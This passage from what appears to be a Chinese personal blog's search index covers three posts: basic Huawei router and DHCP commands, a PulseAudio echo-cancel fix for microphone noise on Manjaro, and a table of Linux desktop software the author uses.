        <content type="html"><![CDATA[<h1 id="华为数通命令集"><a href="#华为数通命令集" class="headerlink" title="华为数通命令集"></a>华为数通命令集</h1><p><strong>基础命令</strong></p><pre><code>&lt;Huawei&gt;system-view               //进入系统视图[Huawei]int GigabitEthernet 0/0/0  // 进入接口视图[Huawei-GigabitEthernet0/0/0]ip address 192.168.1.1 255.255.255.0 //给接口配置ip[Huawei-GigabitEthernet0/0/0]quit   //退到系统视图[Huawei]ping 192.168.1.2  //网络测试&lt;Huawei&gt;save   //保存配置</code></pre><p><strong>DHCP命令</strong></p><blockquote><p>[Huawei]dhcp enable  &#x2F;&#x2F;开启dhcp服务<br>    [Huawei-GigabitEthernet0&#x2F;0&#x2F;0]dhcp select interface   &#x2F;&#x2F;指定开启dhcp的接口</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 数通 </tag>
            
            <tag> 华为 </tag>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>manjaro录音降噪</title>
      <link href="/2023/07/18/linux/manjaro%E5%BD%95%E9%9F%B3%E9%99%8D%E5%99%AA/"/>
      <url>/2023/07/18/linux/manjaro%E5%BD%95%E9%9F%B3%E9%99%8D%E5%99%AA/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>录视频时候发现有噪音问题，网上找了很久，没有找到办法，archwiki有相关教程也没能解决，于是想到以前kalilinux作为主力机时候也有出现过这个问题，于是用相同的方法解决了这个问题。</p><h1 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h1><p><strong>1.备份配置文件</strong></p><pre><code class="shell">sudo cp /etc/pulse/default.pa /etc/pulse/default.pa.bak </code></pre><p>2.修改配置文件</p><pre><code class="shell">sudo vim /etc/pulse/default.pa </code></pre><p>3.将下面的代码添加到default.pa文件结尾</p><pre><code class="shell">#Active Noise Removal.ifexists module-echo-cancel.soload-module module-echo-cancel aec_method=webrtc source_name=mic source_properties=device.description=MicHDset-default-source &quot;mic&quot;.endif </code></pre><blockquote><p>此方法测试发现能够使用在debian发行版和arch发行版，其它linux自测</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> manjaro </tag>
            
            <tag> 降噪 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我在manjaro下使用的软件</title>
      <link href="/2021/05/31/linux/%E6%88%91%E7%94%A8%E7%9A%84manjaro%E8%BD%AF%E4%BB%B6/"/>
      <url>/2021/05/31/linux/%E6%88%91%E7%94%A8%E7%9A%84manjaro%E8%BD%AF%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>循序渐进收集Linux下好用的软件，学习它并替代Windows下的各类软件</p><h1 id="GUI-总览"><a href="#GUI-总览" class="headerlink" title="GUI 总览"></a>GUI 总览</h1><table><thead><tr><th>软件名称</th><th>类别</th><th>安装方式</th><th>备注</th></tr></thead><tbody><tr><td><strong>视频图片类</strong></td><td></td><td></td><td></td></tr><tr><td>kdenlive</td><td>视频处理</td><td>pacman</td><td>视频剪辑软件</td></tr><tr><td>gimp</td><td>图片处理</td><td>pacman</td><td>Linux下的PS</td></tr><tr><td>flameshot</td><td>截图工具</td><td>pacman</td><td>Linux下非常强大的截图工具</td></tr><tr><td>vokoscreen</td><td>视频录制</td><td>pacman</td><td>优秀的录屏软件</td></tr><tr><td>nomacs</td><td>图片查看工具</td><td>pacman</td><td>可以对图片进行简单编辑</td></tr><tr><td>vlc</td><td>视频查看工具</td><td>pacman</td><td>查看视频</td></tr><tr><td>picgo</td><td>图片上传</td><td><a href="https://aur.archlinux.org/packages/picgo/">aur</a></td><td>作图床配合markdown</td></tr><tr><td>cheese</td><td>拍照</td><td>pacman</td><td>茄子拍照</td></tr><tr><td><strong>办公学习类</strong></td><td></td><td></td><td></td></tr><tr><td>gnome-shell-pomodoro</td><td>时间管理</td><td><a href="https://aur.archlinux.org/packages/gnome-shell-pomodoro/">aur</a></td><td>番茄钟</td></tr><tr><td>小书匠</td><td>markdown</td><td><a href="https://github.com/suziwen/markdownxiaoshujiang/releases">http</a></td><td>markdown笔记软件</td></tr><tr><td>typora</td><td>markdown</td><td>pacman</td><td>markdown笔记软件，比较火</td></tr><tr><td>edrawmax-cn</td><td>流程图</td><td><a href="https://aur.archlinux.org/packages/edrawmax-cn/">aur</a></td><td>”亿图图示“类似visio</td></tr><tr><td>thunderbird</td><td>通讯邮箱</td><td>pacman</td><td>“雷鸟” 邮箱</td></tr><tr><td>teamviewer</td><td>远程控制</td><td>pacman</td><td>全平台通用</td></tr><tr><td>telegram</td><td>通讯交流</td><td><a href="https://aur.archlinux.org/64gram-desktop.git">aur</a></td><td>telegram</td></tr><tr><td>geary</td><td>通讯邮箱</td><td>pacman</td><td>邮箱</td></tr><tr><td><strong>小工具</strong></td><td></td><td></td><td></td></tr><tr><td>utools</td><td>工具集</td><td>aur</td><td>工具及搜索</td></tr><tr><td>v2raya</td><td>代理</td><td>aur</td><td>支持多种协议，需要安装v2ray-core</td></tr><tr><td>etcher</td><td>U盘制作</td><td>aur</td><td>好用的U盘制作工具</td></tr><tr><td>gparted</td><td>分区软件</td><td>pacman</td><td>分区工具</td></tr><tr><td>xunlei-bin</td><td>下载工具</td><td>aur</td><td>迅雷</td></tr><tr><td>freedownloadmanager</td><td>下载工具</td><td>pacman</td><td>FDM</td></tr><tr><td>baidunetdisk-bin</td><td>网盘</td><td>aur</td><td>百度云网盘</td></tr><tr><td>checkra1n-cli</td><td>苹果越狱</td><td>aur</td><td>苹果越狱软件</td></tr><tr><td>remmina freeedp</td><td>RDP连接工具,需要再安装freerdp</td><td>pacman</td><td>需要下载freerdp插件</td></tr><tr><td>alacritty</td><td>终端</td><td>pacman</td><td>显卡渲染的终端</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td><strong>影音娱乐</strong></td><td></td><td></td><td></td></tr><tr><td>netease-cloud-music</td><td>音乐</td><td>pacman</td><td>网易云音乐</td></tr><tr><td>electron-netease-cloud-music</td><td>音乐</td><td>pacman</td><td>非官方网易云音乐</td></tr><tr><td><strong>浏览器</strong></td><td></td><td></td><td></td></tr><tr><td>microsoft-edge-stable-bin</td><td>浏览器</td><td>yay</td><td>edge浏览器</td></tr><tr><td>google-chrome</td><td>浏览器</td><td>yay</td><td>google浏览器</td></tr><tr><td>firefox-esr-i18n-zh-cn</td><td>浏览器</td><td>yay</td><td>firefox浏览器</td></tr></tbody></table><h1 id="CLI-总览"><a href="#CLI-总览" class="headerlink" title="CLI 总览"></a>CLI 总览</h1><table><thead><tr><th>软件名称</th><th>类别</th><th>安装方式</th><th>备注</th></tr></thead><tbody><tr><td><strong>系统必备</strong></td><td></td><td></td><td></td></tr><tr><td>dhcpcd</td><td></td><td></td><td></td></tr><tr><td>man-pages-zh_cn man-pages-zh_tw</td><td>中文man</td><td>pacman</td><td>这是两个包，都要安装</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> manjaro </tag>
            
            <tag> 软件 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
